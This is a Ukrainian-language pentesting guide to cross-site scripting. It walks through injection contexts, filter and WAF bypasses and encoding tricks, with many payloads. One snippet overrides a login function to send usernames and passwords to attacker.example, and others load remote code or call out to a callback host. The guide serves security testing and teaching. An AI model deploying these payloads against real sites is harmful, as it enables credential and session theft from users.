# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Перевірте, чи **будь-яке значення, яким ви керуєте** (_parameters_, _path_, _headers_?, _cookies_?) **відображається** в HTML або **використовується** кодом **JS**.
2. **З'ясуйте контекст**, в якому воно відображається/використовується.
3. Якщо **відображається**
1. Перевірте, **які символи ви можете використовувати** і в залежності від цього готуйте payload:
1. В **raw HTML**:
1. Чи можете ви створити нові HTML-теги?
2. Чи можете ви використати події або атрибути, що підтримують протокол `javascript:`?
3. Чи можна обійти захисти?
4. Чи інтерпретується HTML-контент якимось клієнтським JS-двигуном (_AngularJS_, _VueJS_, _Mavo_...), тоді ви можете зловживати [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Якщо ви не можете створити HTML-теги, які виконують JS-код, чи можна зловживати [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Всередині **HTML tag**:
1. Чи можете ви вийти в raw HTML-контекст?
2. Чи можете ви створити нові події/атрибути для виконання JS-коду?
3. Чи атрибут, в якому ви “зачепилися”, підтримує виконання JS?
4. Чи можна обійти захисти?
3. Всередині **JavaScript code**:
1. Чи можете ви вийти з тегу `<script>`?
2. Чи можете ви вийти зі строки і виконати інший JS-код?
3. Чи знаходяться ваші дані в template literals ``?
4. Чи можна обійти захисти?
4. Javascript **function**, що **виконується**
1. Ви можете вказати ім'я функції для виконання. наприклад: `?callback=alert(1)`
4. Якщо **використовується**:
1. Ви можете експлуатувати **DOM XSS**, зверніть увагу, як контролюється ваше введення і чи використовується ваше **контрольоване введення яким-небудь sink**.

При роботі зі складним XSS може бути корисно знати про:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Відображені значення

Щоб успішно експлуатувати XSS, перше, що потрібно знайти — це **значення, яким ви керуєте і яке відображається** на сторінці.

- **Проміжне відображення**: Якщо ви виявили, що значення параметра або навіть path відображається на сторінці, ви можете експлуатувати **Reflected XSS**.
- **Збережено і відображається**: Якщо значення, яким ви керуєте, зберігається на сервері і відображається щоразу при доступі до сторінки, ви можете експлуатувати **Stored XSS**.
- **Доступ через JS**: Якщо значення, яким ви керуєте, отримується через JS, ви можете експлуатувати **DOM XSS**.

## Контексти

При спробі експлуатувати XSS перше, що потрібно знати — **де відображається ваше введення**. В залежності від контексту ви зможете виконувати довільний JS-код різними способами.

### Raw HTML

Якщо ваше введення **відображається в raw HTML**, вам доведеться зловживати якимось **HTML tag**, щоб виконати JS-код: `<img , <iframe , <svg , <script` ... це лише деякі з багатьох можливих HTML-тегів, які ви можете використати.\
Також пам'ятайте про [Client Side Template Injection](../client-side-template-injection-csti.md).

### Всередині атрибуту HTML-тега

Якщо ваше введення відображається всередині значення атрибуту тега, ви можете спробувати:

1. **Втекти з атрибуту і з тега** (тоді ви опинитесь в raw HTML) і створити новий HTML-тег для зловживання: `"><img [...]`
2. Якщо ви **можете втекти з атрибуту, але не з тега** (`>` кодується або видаляється), в залежності від тега ви можете **створити подію**, яка виконає JS-код: `" autofocus onfocus=alert(1) x="`
3. Якщо ви **не можете втекти з атрибуту** (`"` кодується або видаляється), то в залежності від **якого атрибута** відображається ваше значення **і чи контролюєте ви все значення або лише його частину**, ви зможете зловживати ним. Наприклад, якщо ви контролюєте подію типу `onclick=` — ви зможете виконати довільний код при кліку. Інший цікавий приклад — атрибут `href`, де можна використати протокол `javascript:` для виконання довільного коду: **`href="javascript:alert(1)"`**
4. Якщо ваше введення відображається всередині «unexpoitable tags», ви можете спробувати трюк з **`accesskey`** для експлуатації вразливості (потрібна буде якась соціальна інженерія): **`" accesskey="x" onclick="alert(1)" x="`**

Дивний приклад виконання XSS в Angular, якщо ви контролюєте назву класу:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Всередині JavaScript-коду

У цьому випадку ваш введений текст відображається між **`<script> [...] </script>`** тегами HTML-сторінки, всередині `.js` файлу або всередині атрибуту, який використовує протокол **`javascript:`**:

- Якщо відображається між **`<script> [...] </script>`** тегами, навіть якщо ваш ввід знаходиться в будь-яких лапках, ви можете спробувати інжектити `</script>` і вийти з цього контексту. Це працює, тому що **браузер спочатку розбирає HTML-теги**, а потім контент, отже він не помітить, що ваш вкинутий тег `</script>` знаходиться всередині HTML-коду.
- Якщо відображається **inside a JS string** і попередній трюк не працює, вам потрібно **вийти** з рядка, **виконати** свій код і **відновити** JS-код (якщо буде якась помилка, він не буде виконаний:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Якщо відображається всередині template literals, ви можете **вбудовувати JS-вирази** за допомогою синтаксису `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Кодування Unicode** працює щоб записати **валідний javascript-код**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting позначає можливість **оголосити функції, змінні або класи після їх використання, щоб зловживати сценаріями, де XSS використовує неоголошені змінні або функції.**\
**Детальніше дивіться на сторінці:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Кілька веб-сторінок мають endpoints, які **приймають як параметр ім'я функції для виконання**. Поширений приклад у природі: `?callback=callbackFunc`.

Добрий спосіб перевірити, чи значення, надане користувачем, виконується — це **змінити значення параметра** (наприклад на 'Vulnerable') і перевірити консоль на помилки, наприклад:

![](<../../images/image (711).png>)

Якщо вразливе, можна **викликати alert**, просто передавши значення: **`?callback=alert(1)`**. Проте часто такі endpoints **перевіряють вміст**, дозволяючи лише літери, цифри, крапки та підкреслення (**`[\w\._]`**).

Проте навіть з цим обмеженням усе ще можна виконати певні дії. Це тому, що можна використовувати дозволені символи, щоб **доступитися до будь-якого елементу в DOM**:

![](<../../images/image (747).png>)

Деякі корисні функції для цього:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Ви також можете спробувати безпосередньо **trigger Javascript functions**: `obj.sales.delOrders`.

Однак зазвичай endpoints, які виконують вказану функцію, — це endpoints без дуже цікавого DOM; **other pages in the same origin** матимуть **more interesting DOM**, щоб виконувати більше дій.

Тому, щоб **abuse this vulnerability in a different DOM**, було розроблено експлуатацію **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Існує **JS code**, який **unsafely** використовує деякі **data controlled by an attacker**, наприклад `location.href`. An attacker може зловживати цим для виконання arbitrary JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Такі XSS можна знайти **anywhere**. Вони не залежать лише від клієнтської експлуатації веб-застосунку, а від **any** **context**. Ці випадки **arbitrary JavaScript execution** можуть навіть бути використані для отримання **RCE**, **read** **arbitrary** **files** на клієнтах і серверах та іншого.\
Деякі **examples**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Коли ваш input відображається **inside the HTML page** або ви можете escape і inject HTML code у цьому контексті, перше, що треба зробити — перевірити, чи можна зловживати `<` для створення нових тегів: просто спробуйте **reflect** цей **char** і перевірте, чи він **HTML encoded**, або **deleted**, чи відображається **reflected without changes**. **Тільки в останньому випадку ви зможете експлуатувати цю ситуацію**.\
Для таких випадків також **keep in mind** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Примітка: A HTML comment can be closed using** `-->` **or** `--!>`**_

У цьому випадку, і якщо не використовується black/whitelisting, ви можете використовувати payloads, такі як:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Але якщо використовується чорний/білий список тегів/атрибутів, вам потрібно буде **перебрати, які теги** можна створити.\
Після того як ви **виявите, які теги дозволені**, потрібно буде **перебрати атрибути/події** всередині знайдених дійсних тегів, щоб зрозуміти, як атакувати контекст.

### Перебір тегів/подій

Перейдіть за посиланням [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) і натисніть _**Copy tags to clipboard**_. Потім надішліть їх усі за допомогою Burp intruder і перевірте, чи будь-які теги не були визнані WAF шкідливими. Як тільки ви виявите, які теги можна використовувати, ви можете **перебрати всі події** з використанням дійсних тегів (на тій самій сторінці натисніть _**Copy events to clipboard**_ і виконайте ту ж процедуру).

### Користувацькі теги

Якщо ви не знайшли жодного дійсного HTML-тегу, можна спробувати **створити користувацький тег** і виконати JS-код з атрибутом `onfocus`. У XSS-запиті потрібно завершити URL символом `#`, щоб сторінка **зосередила увагу на цьому об'єкті** та **виконала** код:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Якщо використовується якась blacklist, ви можете спробувати її bypass за допомогою кількох хитрих трюків:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Більше tiny XSS для різних середовищ** payload [**можна знайти тут**](https://github.com/terjanq/Tiny-XSS-Payloads) і [**тут**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Останній використовує 2 Unicode-символи, які розширюються до 5: telsr\
Більше таких символів можна знайти [here](https://www.unicode.org/charts/normalization/).\
Щоб перевірити, у які символи вони розкладаються, подивіться [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Якщо для експлуатації вразливості вам потрібно, щоб **користувач клікнув по посиланню або формі** з попередньо заповненими даними, ви можете спробувати [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (якщо сторінка вразлива).

### Неможливо - Dangling Markup

Якщо ви вважаєте, що **неможливо створити HTML-тег з атрибутом, який виконує JS код**, перевірте [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html), бо ви можете **експлуатувати** вразливість **без** виконання **JS** коду.

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

Якщо ви перебуваєте **всередині HTML-тега**, перше, що варто спробувати — це **вийти** з тега і використати деякі з технік, згаданих у [previous section](#injecting-inside-raw-html) щоб виконати JS code.\  
Якщо ви **не можете вийти з тега**, ви можете створити нові атрибути всередині тега, щоб спробувати виконати JS code, наприклад використовуючи деякий payload, наприклад (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Події стилю**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Усередині атрибуту

Навіть якщо ви **не можете вийти з атрибуту** (`"` кодується або видаляється), залежно від **в якому атрибуті** відображається ваше значення та чи контролюєте ви все значення або лише його частину, ви зможете зловживати цим. Для **прикладу**, якщо ви контролюєте подію на кшталт `onclick=` ви зможете змусити її виконати довільний код при натисканні.\
Ще один цікавий **приклад** — атрибут `href`, де можна використовувати протокол `javascript:` для виконання довільного коду: **`href="javascript:alert(1)"`**

**Обхід всередині події за допомогою HTML-кодування/URL encode**

Символи, **закодовані в HTML**, всередині значення атрибутів HTML-тегів **декодуються під час виконання**. Тому щось на кшталт наступного буде дійсним (payload виділено жирним): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Зауважте, що **будь-який тип HTML-кодування є дійсним**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Зверніть увагу, що URL encode також працюватиме:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass всередині event за допомогою Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Спеціальні протоколи в атрибуті

Там ви можете використовувати протоколи **`javascript:`** або **`data:`** в деяких місцях, щоб **виконати довільний JS код**. Деякі вимагатимуть взаємодії з користувачем, деякі — ні.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Місця, куди можна вставляти ці протоколи**

**Загалом** протокол `javascript:` може бути **використаний у будь-якому тегі, який приймає атрибут `href`** і в **більшості** тегів, які приймають **атрибут `src`** (але не `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Інші трюки обфускації**

_**У цьому випадку HTML encoding і Unicode encoding trick з попереднього розділу також є дійсними, оскільки ви знаходитесь всередині атрибуту.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Крім того, є ще один **гарний трюк** для таких випадків: **Навіть якщо ваш ввід всередині `javascript:...` є URL encoded, він буде URL decoded перед виконанням.** Тож, якщо вам потрібно **escape** з **string** за допомогою **single quote** і ви бачите, що **він URL encoded**, пам'ятайте, що **це не має значення,** він буде **interpreted** як **single quote** під час **execution**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Зауважте, що якщо ви спробуєте **використати обидва** `URLencode + HTMLencode` в будь-якому порядку, щоб закодувати **payload**, це **не спрацює**, але ви можете **змішувати їх всередині payload**.

**Використання Hex and Octal encode з `javascript:`**

Ви можете використовувати **Hex** і **Octal encode** всередині атрибуту `src` елемента `iframe` (принаймні) щоб задекларувати **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Якщо ви можете вставити будь-який URL в довільний тег **`<a href=`**, який містить атрибути **`target="_blank" and rel="opener"`**, перевірте **наступну сторінку, щоб скористатися цією поведінкою**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Спочатку перегляньте цю сторінку ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) для корисних **"on" event handlers**.\
У випадку, якщо існує якийсь blacklist, що забороняє вам створювати ці event handlers, ви можете спробувати наступні обхідні шляхи:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS в "Unexploitable tags" (hidden input, link, canonical, meta)

З [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **тепер можливо зловживати hidden inputs за допомогою:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
А в **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
З [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Ви можете виконати **XSS payload inside a hidden attribute**, за умови, що зможете **persuade** **victim** натиснути **key combination**. У Firefox на Windows/Linux комбінація клавіш — **ALT+SHIFT+X**, а на OS X — **CTRL+ALT+X**. Ви можете вказати іншу комбінацію клавіш, використавши іншу клавішу в access key attribute. Ось вектор:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload буде приблизно таким: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

У цій секції вже показано кілька трюків із використанням різних кодувань. Поверніться, щоб дізнатися, де ви можете використовувати:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Прочитайте [ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Прочитайте J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Якщо ви знайшли **XSS у дуже маленькій частині** сайту, яка вимагає якоїсь взаємодії (наприклад невелике посилання у футері з onmouseover), ви можете спробувати **змінити простір, який займає цей елемент**, щоб максимізувати ймовірність його спрацьовування.

Наприклад, ви можете додати стилі в елемент, наприклад: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Але якщо WAF фільтрує атрибут style, ви можете використовувати CSS Styling Gadgets, тож якщо ви знайдете, наприклад

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

Тепер ви можете змінити наше посилання й привести його до вигляду

> \<a href="" id=someid class=test onclick=alert() a="">

Цей трюк взято з [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

У цьому випадку ваш **input** буде **відображений всередині JS коду** у файлі `.js` або між тегами `<script>...</script>`, або в HTML-подіях, що можуть виконувати JS, або в атрибутах, які приймають протокол `javascript:`.

### Escaping \<script> tag

Якщо ваш код вставляється всередині `<script> [...] var input = 'reflected data' [...] </script>`, ви можете легко перервати закриття тега `<script>`:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Зауважте, що в цьому прикладі ми **навіть не закрили одинарну лапку**. Це тому, що **розбір HTML спочатку виконується браузером**, який ідентифікує елементи сторінки, включно з блоками script. Розбір JavaScript для розуміння та виконання вбудованих скриптів виконується лише після цього.

### Всередині JS-коду

Якщо `<>` очищуються, ви все ще можете **вийти з рядка**, де знаходиться ваш ввід, і **виконати довільний JS**. Важливо **виправити синтаксис JS**, бо при наявності помилок JS код не буде виконано:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Коли введені користувачем дані потрапляють всередину взятого в лапки JavaScript string (наприклад, server-side echo у inline script), можна завершити string, inject код і відновити синтаксис, щоб parsing залишався валідним. Загальний скелет:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Приклад шаблону URL, коли вразливий параметр відображається у JS-рядку:
```
?param=test";<INJECTION>;a="
```
Це виконує JS атакуючого без необхідності торкатися HTML-контексту (чистий JS-in-JS). Поєднуйте з blacklist bypasses нижче, коли фільтри блокують ключові слова.

### Template literals ``

Щоб будувати **strings**, окрім одинарних і подвійних лапок JS також підтримує **backticks** **` `` `**. Це відоме як template literals, оскільки вони дозволяють **embedded JS expressions** за допомогою синтаксису `${ ... }`.\  
Тому, якщо ви виявите, що ваш ввід **reflected** всередині JS string, який використовує backticks, ви можете зловживати синтаксисом `${ ... }` щоб виконати **arbitrary JS code**:

Цим можна **зловживати** за допомогою:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Закодоване виконання коду
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Payloads для доставки з eval(atob()) та нюансами scope

Щоб зробити URL коротшими та обійти наївні фільтри за ключовими словами, можна закодувати вашу реальну логіку у base64 та виконати її через `eval(atob('...'))`. Якщо просте фільтрування за ключовими словами блокує ідентифікатори, такі як `alert`, `eval`, або `atob`, використовуйте Unicode-escaped ідентифікатори, які компілюються ідентично в браузері, але уникають фільтрів за співпадінням рядків:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Важливий нюанс області видимості: `const`/`let`, оголошені всередині `eval()`, мають блочну область видимості і НЕ створюють глобальних змінних; вони не будуть доступні для наступних скриптів. Використовуйте динамічно інжектований елемент `<script>` для визначення глобальних, non-rebindable hooks, коли це необхідно (наприклад, щоб hijack a form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Джерело: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode-кодування для виконання JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript техніки обходу чорних списків

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Спеціальні escape-послідовності**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Підстановки пробілів у JS-коді**
```javascript
<TAB>
/**/
```
**JavaScript comments (з** [**JavaScript Comments**](#javascript-comments) **трюку)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (з** [**JavaScript new line**](#javascript-new-lines) **трюк)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript пробіли**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript усередині коментаря**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript без дужок**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



